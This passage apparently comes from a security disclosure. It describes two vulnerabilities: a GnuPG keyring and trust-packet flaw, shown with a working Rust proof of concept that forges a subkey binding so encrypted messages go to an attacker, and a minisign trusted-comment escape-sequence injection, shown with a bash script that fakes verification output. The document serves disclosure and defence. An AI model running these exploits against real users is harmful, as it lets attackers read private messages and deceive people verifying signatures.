   algo = sig->digest_algo;

   /* Check whether we have cached the result of a previous signature
    * check.  Note that we may no longer have the pubkey or hash
    * needed to verify a sig, but can still use the cached value.  A
    * cache refresh detects and clears these cases. */
   if (!opt.no_sig_cache) {
     cache_stats.total++;
     if (sig->flags.checked) /* Cached status available.  */ // [3]
     {
       cache_stats.cached++;
       if (is_selfsig) {
         u32 keyid[2];

         keyid_from_pk(pk, keyid);
         if (keyid[0] == sig->keyid[0] && keyid[1] == sig->keyid[1]) *is_selfsig = 1;
       }
       /* BUG: This is wrong for non-self-sigs... needs to be the
        * actual pk.  */
       rc = check_signature_metadata_validity(pk, sig, r_expired, NULL);
       if (rc) return rc;
       if (sig->flags.valid) { // [4]
         cache_stats.goodsig++;
         return 0;
       }
       cache_stats.badsig++;
       return gpg_error(GPG_ERR_BAD_SIGNATURE);
     }
   }
   // ...
 }

   GnuPG allows usage of these trust packets either temporarily via the
   --keyring argument or via the restore import option. The documentation
   fails to warn the user of the possibility of importing trust packets with
   these operations and the severe security consequences of doing so:

     —keyring file

       * Add file to the current list of keyrings. If file begins with a
         tilde and a slash, these are replaced by the $HOME directory. If the
         filename does not contain a slash, it is assumed to be in the GnuPG
         home directory (”~/.gnupg” unless —homedir or $GNUPGHOME is
         used).
       * Note that this adds a keyring to the current list. If the intent is
         to use the specified keyring alone, use —keyring along with
         —no-default-keyring.
       * If the option —no-keyring has been used no keyrings will be used
         at all.
       * Note that if the option use-keyboxd is enabled in ‘common.conf’,
         no keyrings are used at all and keys are all maintained by the
         keyboxd process in its own database.

     restore/import-restore

       * Import in key restore mode. This imports all data which is usually
         skipped during import; including all GnuPG specific data. All other
         contradicting options are overridden.

   By adding a key binding and convincing their victim to use or import the
   forged keyring, an attacker can:

     * Add themselves (their own subkey) as a recipient for encryption
       operations, undermining confidentiality.
     * Forge signatures that appear as valid, undermining integrity and
       authenticity.
     * Authenticate as being the target, undermining authenticity.
     * Certify new subkeys.
     * Adding UIDs.

  Detailed steps to reproduce

    Scenario

     * Alice wants to send Bob a message.
     * Over a trusted channel, she obtained and verified Bob’s public key.
     * She imports and trusts it.
     * Alice has a malicious keyring of Eve on her device that she passes
       along when encrypting messages, but she does not trust it.
     * Alice encrypts a message for Bob and sends it to him over an untrusted
       channel that Eve can read.
     * Eve can decrypt the message originally intended for Bob.

    Procedure

   To practically decrypt encrypted messages from Alice to Bob, Eve has to:

    1. Get Bob’s public key
    2. Generate a PGP key pair with an encryption subkey
    3. Isolate Eve’s encryption subkey and its signature; e.g. only the
       public subkey and its accompanying signature packet that binds an
       encryption key
    4. Modify the isolated encryption subkey binding signature by replacing
       all occurrences of Eve’s main key fingerprint with Bob’s main key
       fingerprint
    5. Craft a Trust packet for GnuPG, e.g. 0x[cc ff 00 00 00 06 00 03 67 70
       67 00]
    6. Add Bob’s full public key, Eve’s public subkey, Eve’s modified
       subkey binding signature, and the crafted Trust packet together
    7. Get Alice to import the payload into her keyring

   If Alice now uses gpg --keyring ./bob-modified.pgp --encrypt --recipient
   [Bob's full fingerprint], GnuPG will encrypt the text to Eve instead, who
   can then decrypt, read, and modify the message, and send the MITM’d
   message back to Bob, effectively defeating GnuPG’s encryption.

   To demonstrate the attack, we use a public key of the German government as
   Bob’s public key.

   Eve:

 //! ```cargo
 //! [dependencies]
 //! sequoia-openpgp = "2.0.0"
 //! reqwest = { version = "0.11", features = ["json", "blocking"] }
 //! ```

 use reqwest::blocking::get;
 use sequoia_openpgp::cert::prelude::*;
 use sequoia_openpgp::parse::Parse;
 use sequoia_openpgp::policy::StandardPolicy;
 use sequoia_openpgp::Packet;
 use sequoia_openpgp::serialize::Serialize;
 use sequoia_openpgp::Profile;
 fn poc() {
     // 1. Get Bob's public key
     // use one that we certainly don't have a private key for
     // curl https://www.governikus.de/wp-content/uploads/2023/06/governikusPubKey.asc
     let bob_key = get("https://www.governikus.de/wp-content/uploads/2023/06/governikusPubKey.asc")
         .expect("Failed to fetch Bob's public key")
         .bytes()
         .expect("Failed to read Bob's public key as bytes");

     // 2. Generate a PGP key pair with an encryption subkey
     let (eve_cert, _revocation) = CertBuilder::new()
         .set_profile(Profile::RFC4880)
         .expect("Failed to set profile")
         .add_userid("Eve <[email protected]>")
         .add_transport_encryption_subkey()
         .generate()
         .expect("Failed to generate Eve's cert with encryption subkey");

     {
         let mut f = std::fs::File::create("eve-private.asc").expect("create eve-private.asc");
         eve_cert.as_tsk().armored().serialize(&mut f).expect("write eve private tsk");
     }

     // 3.
     let p = &StandardPolicy::new();
     let eve_vc = eve_cert.with_policy(p, None).expect("valid certificate");
     let enc_sub = eve_vc
         .keys()
         .subkeys()
         .for_transport_encryption()
         .next()
         .expect("Eve should have an encryption-capable subkey");

     let eve_subkey_packet = Packet::PublicSubkey(enc_sub.key().clone());

     let binding_sig = enc_sub.binding_signature().clone();

     // 4. Replace Eve's issuer info in the binding signature with Bob's
     let bob_cert = Cert::from_bytes(&bob_key).expect("Parse Bob's public key as a cert");
     let bob_fp = bob_cert.fingerprint();
     let bob_kid = bob_cert.keyid();

     // Byte-level replacement approach
     let eve_fp = eve_cert.fingerprint();
     let eve_kid = eve_cert.keyid();

     let mut sig_bytes = Vec::new();
     Packet::from(binding_sig.clone()).serialize(&mut sig_bytes).expect("serialize binding signature");

     fn replace_all(buf: &mut Vec<u8>, from: &[u8], to: &[u8]) {
         if from.is_empty() || from.len() != to.len() { return; }
         let mut i = 0;
         while i + from.len() <= buf.len() {
             if &buf[i..i + from.len()] == from {
                 buf[i..i + from.len()].copy_from_slice(to);
                 i += from.len();
             } else {
                 i += 1;
             }
         }
     }

     let from_fp_payload: Vec<u8> = std::iter::once(4u8)
         .chain(eve_fp.as_bytes().iter().copied())
         .collect();
     let to_fp_payload: Vec<u8> = std::iter::once(4u8)
         .chain(bob_fp.as_bytes().iter().copied())
         .collect();
     replace_all(&mut sig_bytes, &from_fp_payload, &to_fp_payload);

     replace_all(&mut sig_bytes, eve_fp.as_bytes(), bob_fp.as_bytes());
     replace_all(&mut sig_bytes, eve_kid.as_bytes(), bob_kid.as_bytes());

     // 5.
     let trust_body: Vec<u8> = vec![
         0x00, 0x03,
         b'g', b'p', b'g', 0x00,
     ];
     let trust_packet = sequoia_openpgp::packet::Trust::from(trust_body);

     // 6.
     let mut assembled = Vec::new();
     bob_cert.serialize(&mut assembled).expect("serialize Bob's cert");
     eve_subkey_packet.serialize(&mut assembled).expect("serialize subkey");
     assembled.extend_from_slice(&sig_bytes);
     Packet::from(trust_packet).serialize(&mut assembled).expect("serialize trust packet");

     let out = "bob-modified.pgp";
     std::fs::write(out, &assembled).expect("write assembled payload");
 }


 fn main() {
     poc();
 }

   Eve now generates the payload:

 $ ./gen.rs
 $ cat eve-private.asc
 -----BEGIN PGP PRIVATE KEY BLOCK-----
 Comment: 85EE FE33 F3B8 C24F 2BAD  FD61 15D0 DBE5 1F08 7CF8
 Comment: Eve <[email protected]g>

 xVgEaJjyiBYJKwYBBAHaRw8BAQdAoxFVdlX0HQhLrKz1vddj14KLDM4+Mis0RZrb
 R2+9Y2wAAQDLt2jhdKnDgwrdp3pStQESlwFU/fmq+sAYQXB4TCdNYQ/5wsALBB8W
 CgB9BYJomPKIAwsJBwkQFdDb5R8IfPhHFAAAAAAAHgAgc2FsdEBub3RhdGlvbnMu
 c2VxdW9pYS1wZ3Aub3Jn7rb/MNIP6ZQcHkbT8IJGSFKLDINWNrWHTY6RAQhFmAcD
 FQoIApsBAh4JFiEEhe7+M/O4wk8rrf1hFdDb5R8IfPgAAHpDAQCvxJgvuFf2/clS
 iyRJo0w2kyo5vOrhctBxTeP66h5YTAD+L1XS+Vi99Xf2HUXUejhk4ERrpO/amTkP
 X/4uXZNflQPNFUV2ZSA8ZXZlQGV4YW1wbGUub3JnPsLADgQTFgoAgAWCaJjyiAML
 CQcJEBXQ2+UfCHz4RxQAAAAAAB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEtcGdw
 Lm9yZ1fyjaYRmws3otQV+WYE7w7sd4e6+DBAp55hZT1kjVR2AxUKCAKZAQKbAQIe
 CRYhBIXu/jPzuMJPK639YRXQ2+UfCHz4AADb4AD/fu7+RQwrEKxiRSgRUz5g6V2B
 UyzFWPzvXz7g5qPbD/4BAOcSybR2TQNxkekfpJJUn6SzNbYfnD8dTW7Sn5t01kQG
 x10EaJjyiBIKKwYBBAGXVQEFAQEHQKnHYcyL7hxYkF6B9s5jZjIZopQVM1eYYXQu
 XlquQmtDAwEIBwAA/1zLV0ypbc84PRF8CYTwxuRYoWyFW4F/R6fQABVfeP24EHvC
 wAAEGBYKAHIFgmiY8ogJEBXQ2+UfCHz4RxQAAAAAAB4AIHNhbHRAbm90YXRpb25z
 LnNlcXVvaWEtcGdwLm9yZ+w28Bn8E711FTQ7uUhNhSgWZkFFGFmw5g8zPs+T/FnC
 ApsEFiEEhe7+M/O4wk8rrf1hFdDb5R8IfPgAAI3PAP9qdKmwSvs4kfO2b+Yp4/j6
 BtgL1H7+HTeaI0FYj2ag3gEA9Nes/lO4zbbc9Iwr5iDqxY8+ZjCfwZJj6SjdhtYu
 Tgo=
 =LF50
 -----END PGP PRIVATE KEY BLOCK-----
 % gpg --import eve-private.asc
 ...

   Eve distributes the keyring to Alice, who starts using it.

   Alice:

 $ curl https://www.governikus.de/wp-content/uploads/2023/06/governikusPubKey.asc | gpg --import
   ...
 gpg: key 5E5CCCB4A4BF43D7: public key "Governikus OpenPGP Signaturservice (Neuer Personalausweis) <[email protected]>" imported
 gpg: Total number processed: 1
 gpg:               imported: 1
 $ gpg --edit-key 5E5CCCB4A4BF43D7
 gpg (GnuPG) 2.4.4; Copyright (C) 2024 g10 Code GmbH
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.

 pub  rsa4096/5E5CCCB4A4BF43D7
      created: 2015-03-12  expires: 2028-03-14  usage: SC
      trust: unknown       validity: unknown
 [ unknown] (1). Governikus OpenPGP Signaturservice (Neuer Personalausweis) <[email protected]>

 gpg> trust
 pub  rsa4096/5E5CCCB4A4BF43D7
      created: 2015-03-12  expires: 2028-03-14  usage: SC
      trust: unknown       validity: unknown
 [ unknown] (1). Governikus OpenPGP Signaturservice (Neuer Personalausweis) <[email protected]>

 Please decide how far you trust this user to correctly verify other users' keys
 (by looking at passports, checking fingerprints from different sources, etc.)

   1 = I don't know or won't say
   2 = I do NOT trust
   3 = I trust marginally
   4 = I trust fully
   5 = I trust ultimately
   m = back to the main menu

 Your decision? 5
 Do you really want to set this key to ultimate trust? (y/N) y

 pub  rsa4096/5E5CCCB4A4BF43D7
      created: 2015-03-12  expires: 2028-03-14  usage: SC
      trust: ultimate      validity: unknown
 [ unknown] (1). Governikus OpenPGP Signaturservice (Neuer Personalausweis) <[email protected]>
 Please note that the shown key validity is not necessarily correct
 unless you restart the program.

 gpg>
 gpg: signal Interrupt caught ... exiting
 $ echo "plaintext" | gpg --keyring ./bob-modified.pgp --armor --encrypt --recipient 864E8B951ECFC04AF2BB233E5E5CCCB4A4BF43D7 | tee msg.asc
 -----BEGIN PGP MESSAGE-----

 hF4DCBjxT1PMJncSAQdA6dbUAHA68rR458Uxg1rrsQiOoY+q86/t+IvnEDwrJHgw
 Xs05R9PPeZKKxCgCsxxid+OVEMnTyJiB8wmeFKbhuQW0O3rSNoJy/Mr3tztwwrPA
 0kUBK3n5Q1j+DkLECEk2eqWLwEOSBobxjOJMC5RWc526TCgI+pGR6QdhpFbNBgUp
 V0f+j94QEADZhz8EjicycQfV5RC9siQ=
 =1OtL
 -----END PGP MESSAGE-----

   Eve:

 $ gpg --decrypt msg.asc
 gpg: encrypted with cv25519 key, ID 0818F14F53CC2677, created 2025-08-10
       "Eve <[email protected]>"
 plaintext

Recommendation

   Importing malicious trust packets is already unsafe, as untrusted keys may
   appear as trusted. The documentation should be very clear in warning the
   user that the affected options effectively imply --trust-model always.
   Additionally, the fact that signature checks are cached at all, and that
   they are cached in the user-writable trust packet undermines the entire
   chain of trust, even within keys themselves. Signature caching is a slight
   performance improvement at the cost of massive attack surface, and should
   not be done. Instead, signatures should be verified on use as do many
   other code paths in GnuPG.

References

   Visible links
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-trust-packet-type-id-12
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-subkey-binding-signature-ty

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="14-trustcomment.txt"
Content-Transfer-Encoding: 8bit

                      Trusted comment Injection (minisign)

   A vulnerability in minisign allows attackers to craft signatures whose
   trusted comment field contains malicious terminal escape sequences or
   misleading commands.

  Impact

   Exploitation enables attackers to deceive users during signature
   verification by injecting terminal control sequences. This can clear the
   terminal and overwrite the prompt with a forged command invocation, making
   it appear as if a different file and signature were successfully verified,
   or generally confuse them about the content of the trusted comment and
   another program output.

  Details

   minisign supports attaching metadata in a trusted comment to a signature.
   The trusted comment is stored in plaintext inside the .minisig file and
   displayed to the user during verification.

   However, no sanitization or escaping is applied before printing. Arbitrary
   byte sequences, including ANSI escape codes, may be inserted.

   An attacker can therefore craft a signature whose trusted comment injects
   terminal sequences that erase the previous output and replace it with a
   forged verification command line for a different file.

   Generally, it is considered best practice for CLI tools, especially
   cryptographic CLI tools, to not print potentially attacker controlled CLI
   tools, or at least first tell the user that what follows is binary output,
   with a [y/N] style prompt.

  Scenario

   Bob is verifying multiple, potentially many, messages from different
   singers. One of them Alice, who sent msg2.txt with signature
   msg2.txt.minisig. Bob previously obtained Alice’s public key pubkey2.txt
   through a secure channel. Another message, comes from Mallory, who’s
   public key pubkey1.txt Bob also previously obtained. Mallory holds a MITM
   on Bob’s connection with Alice. When Alice sends her message, Mallory
   switches it out for a malicious one, but leaves the original signature
   file unchanged. Furthermore, Mallory crafts a special message of her own,
   that leads to a terminal output crafted to deceive Bob into thinking that
   he verified the signature of Alice’s message successfully.

  Detailed Steps to Reproduce

   Alice crafts her message in the following way

 #!/bin/bash

 echo 'Hello world' > msg1.txt

 echo "Creating a minisign key pair..."
 rm pubkey1.txt seckey1.txt msg1.txt.minisig | true
 minisign -G -W -p pubkey1.txt -s seckey1.txt <<<'[email protected]'

 # can use everything but \r and \n in here.
 # instead we use \e[1E
 # alternatively it could instruct the user to update the software from a mallicious source
 tc=$'\e[2J\e[H$ minisign -V -p pubkey1.txt -m msg1.txt -x msg1.txt.minisig\e[1ESignature and comment signature verified\e[1ETrusted comment: timestamp:1755343355\tfile:msg2.txt\thashed\e[1Eminisign -V -p pubkey2.txt -m msg2.txt -x msg2.txt.minisig\e[1ESignature and comment signature verified\e[1ETrusted comment: timestamp:1755343359\tfile:msg2.txt\thashed'

 minisign -S -s seckey1.txt -m msg1.txt -t "$tc"

 # Bob then executes:
 minisign -V -p pubkey1.txt -m msg1.txt -x msg1.txt.minisig

   Bob then executes

 $ minisign -V -p pubkey1.txt -m msg1.txt -x msg1.txt.minisig

   and gets the following output on his terminal.

 $ minisign -V -p pubkey1.txt -m msg1.txt -x msg1.txt.minisig
 Signature and comment signature verified
 Trusted comment: timestamp:1755343355   file:msg2.txt   hashed
 $ minisign -V -p pubkey2.txt -m msg2.txt -x msg2.txt.minisig
 Signature and comment signature verified
 Trusted comment: timestamp:1755343359   file:msg2.txt   hashed

   If Bob is inattentive, he might be tricked into thinking that he already
   verified Alice’s message.

--EVF5PPMfhYS0aIcm--
